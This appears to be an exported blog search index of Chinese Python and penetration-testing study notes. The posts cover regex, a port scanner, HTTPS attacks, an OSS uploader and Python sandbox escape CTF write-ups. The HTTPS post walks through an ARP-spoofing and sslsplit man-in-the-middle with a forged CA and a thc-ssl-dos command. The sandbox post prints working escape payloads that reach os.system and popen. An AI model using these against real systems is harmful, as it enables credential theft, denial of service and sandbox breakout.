<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[python3正则表达式学习]]></title>
    <url>%2F2018%2F06%2F15%2Fpython3%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[###python3正则表达式学习 正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。 compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 ###正则表达式基础 子模式 1234\w: 匹配任意字母、数字、或者_\d: 匹配数字（十进制）\s: 匹配空白符号（空格、tab等）. : 匹配任意字符（换行符除外） 重复子模式 123\d* : 表示任意数字，包括0个，*匹配0次或者多次\w+ : 表示匹配至少一个字母、数字、或者_\w&#123;3:6&#125; :表示匹配3-6之间的字母、数字、或者_ “或”运算 - | (p|P)ython :可以匹配Python也可以匹配python 选择符：？ 1(https://)?(www.)?(lsowl.xyz) :可以匹配到：https://www.lsowl.xyz https://lsowl.xyz www.lsowl.xyz lsowl.xyz 四个，也就是字符串必须在最后一个元组才可以被匹配到 字符集：[] 12[a-zA-Z0-9_] : 等价于\w[0-9a-zA-Z\.\_] : 匹配数字、字母、.和_ 开始符和结尾符：^ , $ 123^\d : 以数字开始\w$ : 以字母结尾^[a-zA-Z][0-9a-zA-Z\_]* :匹配python的合法变量 分组: () 捕获组 (^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名 非捕获组 123(^[0-9a-zA-Z]\w&#123;5,17&#125;)@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名(?:\d+\.)&#123;3&#125;\d+ : 匹配IP 正则表达式使用的特殊符号和字符 12345678910111213141516171819202122literal 匹配字符串的值re1|re2 匹配正则表达式re1或re2. 匹配任意字符（换行符除外）^ 匹配字符串的开始$ 匹配字符串的结尾* 匹配前面出现的正则表达式零次或多次+ 匹配前面出现的正则表达式一次或多次？匹配前面出现的正则表达式零次或一次&#123;N&#125; 匹配前面出现的正则表达式N次&#123;M,N&#125; 匹配重复出现M次到N次的正则表达式[…] 匹配字符组里出现的任意一个字符[…x-y…] 匹配从字符x到y中的任意一个字符[^…] 不匹配此字符集中出现的任意一个字符(*|+|?|&#123;&#125;)? 用于上面出现的任何“非贪婪”。版本重复匹配次数符号。如.*?a表示匹配到第一个a出现取前面任意长度的字符。(…) 匹配封闭括号中正则表达式（RE），并保存为子组\d 匹配任何数字，和[0-9]一样（\D是\d的反义：任何非数字）\w 匹配任何数字字母字符，和[A-Za-z0-9_]相同(\W是\w的反义)\s 匹配任何空白符，和[\n\t\r\v\f]相同（\S是\s的反义）\b 匹配单词边界(\B是\b的反义)\nn 匹配已保存的子组（参考(…)）如price:\16\c 逐一匹配特殊字符c（即，取消它的特殊含义，按字面匹配）\A（\Z）匹配字符串的起始（结束） 一些说明 （1）用管道符号(|)匹配多个正则表达式（2）匹配除换行符外任意一个单个的字符（.）（3）从字符串的开头或结尾或单词边界开始匹配（^ $或\A \Z \b \B）（4）创建字符类（[]）（5）指定范围（-）和否定（^）（6）使用闭包操作符（* + ？ {}）实现多次出现/重复匹配（7）？的两种含义： 表示匹配出现0或1次； 紧跟在表示重复的元字符后面时（如+?），表示要求搜索引擎匹配的字符串越短越好。(*+?{m,n})尽量“吸收”更多的字符，这叫“贪心”。 （7）特殊字符表示、字符集 \d表示十进制数字（\D表示非十进制数字） \w表示整个字符数字的字符集（\W） \s表示空白字符（\S） （8）用圆括号（()）组建组 、()的功能：对正则表达式进行分组；匹配子组。 对正则表达式进行分组可以实现用不同的正则表达式去匹配字符串，或重复整个正则表达式多次。 使用子组匹配是为了能够提取匹配模式的内容，Python的re支持此功能。 ###python的re模块 re模块的用法 1234567891011import restr = "xxxflag&#123;sss&#125;sss"# #用法1：re_flag = re.compile(r'flag&#123;\w+?&#125;')flag = re_flag.findall(str)print(flag)#用法2：flag =re.findall(r'flag&#123;\w+?&#125;',str)print(flag) 贪心匹配和非贪心匹配 贪心匹配：正则表达尽可能多的匹配元素 非贪心匹配：正则表达式尽可能少的匹配元素 match和search的区别 match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，返回None search匹配整个字符串，直到找到一个匹配 分组匹配（优点在说明第（8）点） ###python中常用的正则表达式处理函数 re.match() 尝试从字符串的起始位置匹配一个模式，如果不是起始位置就匹配成功，match返回none 函数语法 re.match(partten,string,flags=0) 函数参数说明 使用group(num)或groups()匹配对象函数来获取匹配表达式 re.search() 扫描整个字符串并返回第一个成功的匹配 函数语法 re.search(pattern,string,flags=0) 使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 re.sub()用于替换字符串中的匹配项 函数语法 re.sub(pattern,repl,string,count=0) 函数参数说明 使用实例(包含是否使用repl参数的，repl可能是个函数) re.compile() 用于编译正则表达式，生成一个正则表达式对象供match和search两个函数使用 函数语法 re.compile(pattern[, flags]) 参数说明 使用实例（当匹配成功的时候返回一个match对象） re.findall() 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回一个空列表 函数语法 findall(string[, pos[, endpos]]) 函数参数 使用实例（用compile函数生成正则表达式对象） re.finditer() 和findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回 函数语法 re.finditer(pattern, string, flags=0) 函数参数 使用实例(用for循环迭代输出) re.split() split 方法按照能够匹配的子串将字符串分割后返回列表 函数语法 re.split(pattern, string[, maxsplit=0, flags=0]) 函数参数 使用实例（对于一个找不到匹配的字符串，split不会分割） ###正则表达式对象 re.RegexObject (re.compile() 返回的就是一个正则表达式对象) group()返回被RE匹配的字符串 start() 返回开始匹配的位置 end() 返回匹配结束的位置 span()返回一个元组包含（开始，结束）的位置]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简易端口扫描器]]></title>
    <url>%2F2018%2F06%2F14%2F%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8%2F</url>
    <content type="text"><![CDATA[只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。 程序运行实例 打印装逼信息： 扫描实例： 具体用法程序中有说明 程序说明 程序中默认扫描一些常见的端口、支持用户设置端口、支持多端口扫描、支持多IP扫描、支持网段存活主机发现、支持导出。 通过发送ping包，根据返回包的TTL值判断主机是否存活，关键代码如下： 123456789101112131415161718192021def run(self): try: cmd = ["ping", "-&#123;op&#125;".format(op=self.get_os()), "1", self.ip_pre] output = os.popen(" ".join(cmd)).readlines() except: return False if lock.acquire(): flag = False for line in list(output): if not line: continue if str(line).upper().find("TTL") &gt;=0: flag = True break if flag: print "[+] IP: %s is OK " % self.ip_pre ip_str.append(self.ip_pre) lock.release() return True 通过socket建立tcp全连接来判断端口开放信息以及banner信息的抓取，关键代码如下： 123456789101112131415161718192021def Ping(self, Port): global OpenPort, lock, Timeout sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.settimeout(Timeout) address = (self.IP, Port) try: sock.connect(address) ready = select.select([sock],[],[],1) except: return False if lock.acquire(): OpenPort.append(str(Port)) ScanIP_list.append(self.IP) if ready[0]: print "IP:%s Port:%d Open " % (self.IP, Port) +sock.recv(4096) sock.close() else: print "IP:%s Port:%d Open " % (self.IP, Port) + "Unknow!\n" sock.close() lock.release() return True 通过队列来判断扫描目标的端口列表是否为空，通过判空来控制在端口扫描的时候不会漏扫，还有就是在多IP端口扫描的时候避免出现误扫IP的状况，关键代码如下： 1234def run(self): while not self.SingleQueue.empty(): p = self.SingleQueue.get() self.Ping(p) 调用cmd模块来进行交互，用户通过这个模块来设置线程（在中程序中控制在1-5000，可以修改）、设置连接超时时间、设置端口、进行端口扫描、ping扫描等。关键代码如下：（贴出设置端口、单IP扫描、ping扫描的代码，具体代码请看源码） 1234567891011121314151617def do_port(self, argv): global PortList PortList = [] ListTmp = argv.split(' ') for port in ListTmp: if port.find("..") &lt; 0: if not port.isdigit(): print "Input error!" return False PortList.append(int(port)) else: RangeLst = port.split("..") if not (RangeLst[0].isdigit() and RangeLst[1].isdigit()): raise ValueError exit() for i in range(int(RangeLst[0]), int(RangeLst[1])): PortList.append(i) 123456789101112131415161718192021def do_scan(self, argv): print "Start Time %s" % time.ctime() + '\n' global nThread, PortList, strIP, ScanIP_list, OpenPort del ScanIP_list[:] del OpenPort[:] ThreadList = [] try: strIP = socket.gethostbyname(str(argv)) except: print "Input error!" return False SingleQueue = GetQueue(PortList) if PortList != None: for i in range(0, nThread): t = ScanThreadSingle(strIP, SingleQueue) ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join() print '\n' + "End Time %s" % time.ctime() 1234567891011121314151617def do_ping(self, argv): global commandargs ThreadList = [] print "Start Time %s" % time.ctime() + '\n' commandargs = str(argv) print "[+] Input is %s " % commandargs + '\n' args = "".join(commandargs) ip_prefix = '.'.join(args.split('.')[:-1]) for i in range(1,255): ip = '%s.%s' % (ip_prefix,i) s = PING(ip) ThreadList.append(s) for s in ThreadList: s.start() for s in ThreadList: s.join() print '\n' + "End Time %s" % time.ctime() 这些就是整个程序中核心的几个模块，具体代码请看源码。 总结 此次设计参考了P牛早期的一个设计以及Python线程锁的处理方法。实现的功能比较单一，还可以添加SYN半连接扫描、UDP扫描、僵尸扫描等功能；但是由于Windows底层的原因，利用Python在Windows上构造数据包有些困难；在linux上可以通过scapy进行原始数据包的构造与发送，通过网络流量中的一些特征来判断。一些扫描脚本可以看四层发现中的一些脚本。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS攻击]]></title>
    <url>%2F2018%2F06%2F13%2FHTTPS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[在学习HTTPS攻击之前首先要了解为什么要进行全站HTTPS，全站HTTPS的应用会让链路中的流量加密传输，在HTTP协议明文传输时会发生链路劫持等情况，不论是黑客还是运营商劫持的难度较低，全站HTTPS的应用大大的提高了劫持的难度。在理论上所有的加密都是可以破解的，前提就是看你是否接受这个成本。目前全站HTTPS的应用已经很广泛了，如百度、淘宝等。 HTTPS及其相关知识 HTTPS的作用 CIA(信息安全三要素：机密性、完整性、可用性（HTTPS中是合法用户可以访问权限以内的资源）) 解决的是信息在传输过程中数据被篡改、窃取 加密：对称、非对称、单向 HTTPS攻击方法 降级攻击（HTTPS加密套件是多种加密方式，强制采用低强度的加密方式） 解密攻击（明文、证书伪造） 协议漏洞、实现方法的漏洞、配置不严格（漏洞来源的角度） SSL（全称Secure socket layer） 保证网络通信安全的加密协议 TLS取代SSL v3(由于SSL协议漏洞使得大家认为其漏洞不可软件修复） Heartbleed POODLE BEAST SSL/TLS用于其他场景的传输通道加密 邮件传输（服务器间、客户端与服务期间） 数据库服务器间的通信 LDAP身份认证服务器间的通信 SSL VPN 远程桌面RDP通信过程中的加密和身份认证 WEB通信中的SSL加密 公钥证书（受信任的第三方证书颁发机构签名颁发） Versign Thawte Globalsign Symantec 加密过程 握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输 常见的加密算法 非对称加密算法（适合加密少量的数据） Diffie-Hellman key exchange RSA ECC 对称加密算法（适合加密大量的数据） DES / 3DES AES （主流对称加密算法） IDEA RC4（生命周期短） WEP、TLS/SSL、RDP、secure shell 单向加密算法（hash） MD5 SHA-1 、 SHA-2 SHA-2是TLS1.2唯一支持的单向加密算法 碰撞攻击针对单向加密算法（两个不同的文件生成相同的hash值） SSL的弱点 SSL是不同的对称、非对称、单向加密算法的组合加密实现（加密套件） 服务器端为了提供更好的兼容性，选择支持大量过时的cipher suite 协商过程中强迫降级加密强度 现代处理器计算能力可以在可接受的时间内破解过时加密算法（使用云计算） HTTPS实践在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息 openssl(用户层的一个操作系统命令，直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite) 使用OpenSSL连接探测 openssl s_client -connect www.baidu.com:443 探测目标站点是否支持不安全的加密套件 openssl s_client -tls1_2 -cipher &#39;NULL,EXPORT,LOW,DES&#39; -connect www.baidu.com:443 通过OpenSSL查看不安全的加密套件 openssl ciphers -v &#39;NULL,EXPORT,LOW,DES&#39; 使用SSLScan识别 自动识别SSL配置错误、过期协议、过时cipher suite和hash算法 默认检测CRIME、heartbleed漏洞 测试支持TLS_1.2: sslscan --tlsall www.taobao.com:443 分析证书的详细信息 sslscan --show-certificate --no-ciphersuites www.taobao.com:443 SSLyze探测 Python编写 检测SSL过时版本、存在弱点的cipher suite、是否支持会话恢复 sslyze --regular www.taobao.com 进行信息的探测 nmap脚本探测： sudo nmap --script=ssl-enum-ciphers.nse www.taobao.com 第三方网站扫描： www.ssllabs.com/ssltest 实际攻击的一些方法SSL/TLS中间人攻击（攻击者位于客户端和服务器通信链路中，中间人伪造证书进行加解密进行流量劫持） 这里举个例子，在我们使用代理工具的时候会在浏览器上面设置代理，但在真正的生产环境中我们是不可能将目标的浏览器代理设置为我们的地址，所以就要用到以下的方法 ARP欺骗（最常用的中间人攻击方式） DHCP（四步过程中的第一步一定是广播，谁先相应先给谁确认） 修改网关（手动修改，理论上成立，在现实环境中很难实现） 修改DNS 修改HOSTS（手动修改的这几个在生产环境中实现的条件非常苛刻） ICMP、STP（交换树协议，避免逻辑环路，实现高可用）、OSPF（攻击者和被攻击者出于同一个局域网可以通过攻击一些网络协议） 通过伪造CA证书实现SSL中间人攻击的原理图： 实现SSL中间人攻击的前提（如果SSL中间人攻击以后客户端不提示一些告警信息，用户是很难发现被攻击的） 客户端已经信任伪造证书颁发机构 攻击者控制了合法的证书颁发机构 客户端程序禁止了显示证书错误告警信息 攻击者已经控制客户端，并强制其信任伪造证书 SSLsplit（只需要在攻击者的机器上配置好以后就可以实现对经过的流量解密，也称为HTTPS降级攻击） 透明的SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成普通客户端 伪装服务器需要伪造证书（这里就需要在本地生成一张伪造证书） 支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击（不仅限于https解密） 攻击原理： 监听https流量，更改重定向连接中的location，替换https为http并记录；更改响应内容中的超链接，替换https为http并记录；与用户进行http通信、与服务器进行https通信（记录中本应该是https的请求），从而获取用户信息。 使用openssl伪造中间人的证书： 使用OpenSSL生成证书私钥：openssl genrsa -out ca.key 2048 现在主要使用的就是2048或4096位 利用私钥签名生成证书： openssl req -new -x509 -days 1096 -key ca.key -out ca.crt （这个证书就是伪造的中间人的根证书，伪造信息的时候仅可能的真实） 这里生成的根证书会被sslsplit调用生成通信的证书 开启中间人机器的路由功能（实现真正的路由转发，相当于一个路由器） sudo sysctl -w net.ipv4.ip_forward=1 修改的文件在 /proc/sys/net/ipv4/ip_forward 配置iptables规则实现端口转发调用证书：（因为sslsplit工作在特定的端口上） 查看80、443端口是否被占用 netstat -pantu | grep 80 netstat -pantu | grep 443` 查看当前防火墙中的nat规则 sudo iptables -t nat -L 12345678980端口重定向到8080端口sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080443端口重定向到8443端口sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443将邮件提交代理（MSA）、SMTPS、IMAPS、POP3S重定向到8443端口(可以将加密的流量都转发)sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 使用一台WIN7的虚拟机进行arp欺骗： sudo arpspoof -i ens33 -t 192.168.240.131 -r 192.168.240.2 查看win7的Mac地址发现已经被欺骗 开启sslsplit监听端口（sslsplit的作用是调用伪造证书服务器根证书(ca.crt)针对不同网站签发不同的证书，比如：针对百度伪造类似百度的证书，针对淘宝伪造类似淘宝的证书 ） 建立一个数据存放目录： mkdir -p test1/logdir sudo sslsplit -D -l connect.log -j /home/toml/test1/ -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 可以看到生成证书的内容 当被劫持的客户端访问一些做了https的网站，比如淘宝，客户端输入的一些数据经过sslsplit就会被降级解密，理论上是这样，但是现在出现一个尴尬的情况：开启流量转发后arp欺骗也成功了，结果客户端不能正常访问页面。通过分析是https降级失败。 重新进行了https降级，客户端访问页面出现证书不受信任的警告： 在客户端访问做了全站https的淘宝并模拟登陆：（并在logdir目录下查看传输数据的记录） 匹配输入账号密码的字符 sudo grep 123123 * 并查看文件，发现数据都可以明文查看到 HTTPS结合伪造证书降级攻击成功，如果是在真实环境中，为了完美的攻击，可以将伪造的根证书传到客户端浏览器上，这样客户端就不会提示告警信息了。 SSL/TLS拒绝服务攻击 由于SSL在正式加密通信之前，会进行一个协商的机制，协商使用哪种加密套件等，协商成功以后建立SSL的通信，在这个过程中会产生大量的连接，在一定程度上https对会增大服务器的开销。 thc-ssl-dos（一个ssl dos工具，利用的SSL的安全重连接的特性，打死的不是带宽，而是服务器的资源，产生的流量很小，但是效果却很好） SSL协商加密对性能开销增大，大量握手请求会造成拒绝服务 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL连接请求，造成服务器资源过载 与流量式拒绝服务(占用所有的带宽)攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器 服务器平均可以处理300次/秒SSL握手请求 对SMTPS、POP3S等服务同样有效 thc-ssl-dos 199.233.209.205 2083 –accept 对策 禁用SSL-Renegotiation、使用SSL Accelerator 测试网站是否禁用了SSL-Renegotiation openssl s_client -connect 通过修改thc-ssl-dos代码，可以绕过以上对策 web其他知识点补充 AJAX Asynchronous JavaScript and XML 是一个概念，而非一种新的编程语言，是一组现有技术的组合 通过客户端脚本动态更新页面部分内容，而非整个页面 降低带宽使用，提高速度 提升用户体验 后台异步访问 AJAX组件 JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口像服务器发起请求，接收并处理服务器响应数据 DHTML 早于AJAX出现，通过JavaScript、css等在客户端修改HTML页面element，缺点是完全依赖于客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了它的缺点（注册用户） DOM 处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的properties、method、event 基于AJAX的WEB应用工作流程 XMLHTTPRequest API创建对象xmlhttp进行访问 xml、json、HTML、文本、图片 多个异步请求独立通信，互不依赖 AJAX框架 JQuery Dojo Toolkit Google web tookit(GWT) microsoft AJAX library AJAX攻击面不为大多数人所知 AJAX的安全问题 多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程 AJAX引擎是个权功能的解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露 暴露应用程序逻辑 AJAX对渗透测试的挑战 异步请求数量多且隐蔽 触发AJAX请求的条件无规律 手动和截断代理爬网可能产生大量遗漏 AJAX爬网工具 OWASP_ZAP（在攻击模块中） 客户端代码审计 源码 firebug / f12 中的XHR WEB SERVICE 面向服务的架构，便于不同系统集成共享数据和功能 尤其适合不想暴露数据模和程序逻辑而访问数据的场景 无页面 两种类型的WEB service SOAP 传统的web service 开发方法，xml是唯一的数据交换格式 要求安全性的应用更多采用 RESTFUL 更多被采用的轻量web service,JSON是数据交换格式 WEB service安全考虑 使用的api key或session token实现和跟踪身份认证 身份认证有服务器完成，而非客户端 API key、用户名、session token永远不要通过URL发送 RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全 SOPA提供提供强于HTTPS的WS-security机制（在传输层实现数据加密） 使用OAuth 或 HMAX进行身份验证，HMAX身份认证使用C/S共享密钥加密API KEY RESTful应只允许身份认证用户使用PUT、DELETE方法 使用随机token防止CSRF攻击 对用户提交参数过滤，建议部署基于严格白名单的方法 报错信息消毒 直接对象引用应严格身份验证（电商公司已ID作为主索引）]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里云OSS智能上传图床]]></title>
    <url>%2F2018%2F06%2F13%2F%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%2F</url>
    <content type="text"><![CDATA[背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。 程序流程图如下： 功能实现图片截图以后，从粘贴板获取图片保存到本地Image文件夹下 使用win32clipboard，win32con，PIL模块 1234import win32conimport win32clipboard as wfrom PIL import ImageGrabfrom PIL import Image 123im = ImageGrab.grabclipboard() #从粘贴板获取内容 if isinstance(im,Image.Image): #判断是不是图片 name = str(time.time()) + ".png" 获取到图片以后判断是否为图片然后保存到本地 这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存 将图片上传以后的生成的访问地址添加到粘贴板 使用win32clipboard，win32con模块 12345def setText(self,aString): w.OpenClipboard() w.EmptyClipboard() w.SetClipboardData(win32con.CF_TEXT,aString) w.CloseClipboard() 这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码 上传图片到OSS 使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3 123456def upload(self,file_name,name): bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name) data = bucket.put_object_from_file(key='Blog/'+ name,filename='image/'+ name, headers=None, progress_callback=None) str = "https://xxxxxx.xx/" + name shutil.rmtree('image') 这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint 说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合 shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。 设置阿里云OSS的接口信息 通过外部的config文件导入 123456789101112131415try: infoDict = &#123;&#125; with open("config.conf","r") as file: ApiInfo = file.readlines() for info in ApiInfo: try: if info != "\n" and info != "": tmp = info.split("=") infoDict[tmp[0].strip()] = tmp[1].strip() except Exception as e: print u"[-] 请按照要求配置config.conf" sys.exit() except Exception as e: print u"[-] 请在config.conf中配置阿里云 API信息" sys.exit() 结果示例 参考文章 [OSS SDK-Python]:https://github.com/aliyun/aliyun-oss-python-sdk 更新说明 现在已经修改可以支持python3的环境，详情请看github]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python沙盒逃逸学习]]></title>
    <url>%2F2018%2F06%2F11%2Fpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演示一下。比赛中涉及的到Python沙盒逃逸往往是利用语言特性来逃逸，但是其实这只是从Python解释器的逃逸，从严格意义上说这是不完全的。从现实意义上来讲更进一步的是利用沙盒的逃逸来控制整个系统，Python的模块通常都是大量C代码的封装，这里面就有未被发现的内存破坏漏洞。所以比赛的题目只是一种思路，更多的还是要结合到实际生产环境中。 实例一 实验脚本：题目的设置，删除一些内建函数（Python语言加载的时候会自动加载系统的内建模块，python2中是builtin，Python3中是builtins） 12345678910111213141516171819202122def make_secure(): UNSAFE = ['open','file','execfile','compile','reload','__import__','eval','input'] for func in UNSAFE: del __builtins__.__dict__[func] from re import findall #Remove dangerous builtinsmake_secure()print 'Go Ahead,Expoit me &gt; ;D'while True: try: print "&gt;&gt;&gt;", #Read user input until the first whitespace character inp = findall('\S+',raw_input())[0] a = None #Set a to the result from executing the user input exec 'a='+inp print '&gt;&gt;&gt;',a except Exception, e: print 'Exception:',e#后面这一段主要是将结果以字符串的形式操作并显示 脚本运行结果：（环境的限制权限非常低）这里其实就是模拟Python的命令行界面，然后进行相应的操作，只是将一些内建函数删除了，所以无法调用系统命令等等 正常情况下Python的使用可以调用OS等模块，就可以进行系统命令的调用和文件操作等等：但是经过限制以后的环境就不可以调用了，因此不能调用系统命令拿到flag 由于删除了对应的内建函数，所以我们要利用Python的特性来绕过这种限制：Python中可以利用file来read文件 但是我们可以发现直接用file这种方式也是被限制了的，所以利用对象的概念，通过元组来加载：（有一个知识点：bases : 类的所有父类构成元素（包含了一个由所有父类组成的元组）） 通过将所有父类组成的元组显示出来以后可以找到file在第40个，然后我们可以通过硬编码的方式调用file加载文件找到flag： ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read() 实例二 首先还是贴上环境的脚本，前提条件和实例一差不多：（不同的是这里能够执行的内建函数只有输入输出，与实例一不同的还有就是这里不回显数据 ） 1234567891011121314151617181920212223#!/usr/bin/pythonprint "Welcome to my python sandbox! Enter commands below!" banned = ['import','exec','eval','pickle','os','subprocess','kevin sucks','input','banned','cry sum more','sys'] targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: del __builtins__.__dict__[x] while 1: try: print "&gt;&gt;&gt;", data = raw_input() for no in banned: if no.lower() in data.lower(): #将输入的字符转换为小写和banned中的字符转换为小写比较 print("Permission Denied") break exec data except: print '' 环境运行结果如下： 思路与实例一还是一样，都是使用所有父类组成的元组，这里要使用到catch_warnings类（索引在59），进行命令执行 print ().__class__.__bases__[0].__subclasses__() ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;) 经过测试以后发现这里其实可以不用执行59的那个子类，因为没有禁用print函数，当然这里的59这个子类可以用到实例一中进行ls的调用 print ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read() 实例三 实验环境代码如下：（这里用Python3写的，与前两个相比，这里先删除了两个危险的函数，然后对其他许多函数做了过滤，还对一些字符，如’.’都进行了过滤） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#-*-coding:utf-8-*-#!/usr/bin/python3 import sys, cmd, os del __builtins__.__dict__['__import__']del __builtins__.__dict__['eval'] intro= """ pwnhubcuit pwneverything Rules: -No import -No ... -No flag """ def execute(command): exec(command, globals()) class Jail(cmd.Cmd): prompt = '&gt;&gt;&gt; ' filtered ='\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'.split('|') def do_EOF(self, line): sys.exit() def emptyline(self): return cmd.Cmd.emptyline(self) def default(self, line): sys.stdout.write('\x00') def postcmd(self, stop, line): if any(f in line for f in self.filtered): print("You are a big hacker!!!") print("Go away") else: try: execute(line) except NameError: print("NameError: name'%s' is not defined" % line) except Exception: print("Error: %s" %line) return cmd.Cmd.postcmd(self, stop,line) if __name__ == "__main__": try: Jail().cmdloop(intro) except KeyboardInterrupt: print("\rSee you next time!") 所以这里就没有办法使用前面说的利用子类进行系统的调用，这里通过获取系统函数地址进行绕过： print(getattr(os, &quot;system&quot;)(&quot;ls&quot;)) print(getattr(os, &quot;system&quot;)(&quot;cat flag&quot;)) 以上三个实例就是利用Python作为脚本语言的特性来逃逸 实例四 拿最近一次比赛中的沙盒逃逸来演示一下。 拿到赛题以后nc连接一下并输入一些语句进行测试：（也是许多函数被限制且不回显，经过测试发现是Python2写的环境并且没有过滤‘ . ’） 这里和我们前面的练习不一样，这里必须要调用系统命令ls来看一下存放flag的文件，找到一个和getattr函数类似的函数getattribute print ().__class__.__bases__[0].__getattribute__(&#39;o&#39;+&#39;s&#39;,&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;) 发现可以使用单引号调用参数 ().__class__.__bases__[0].__getattribute__(__import__(&#39;o&#39;+&#39;s&#39;),&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;) 构造第二个payload，尝试使用导入os模块的方法调用系统命令，结果失败，过滤了os: 这个时候我们换一下思路，调用子类中的函数catch_warnings，在第59个，构造paylad: print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s&#39;).read 成功列出了目录，经过测试flag在home/ctf目录下： print 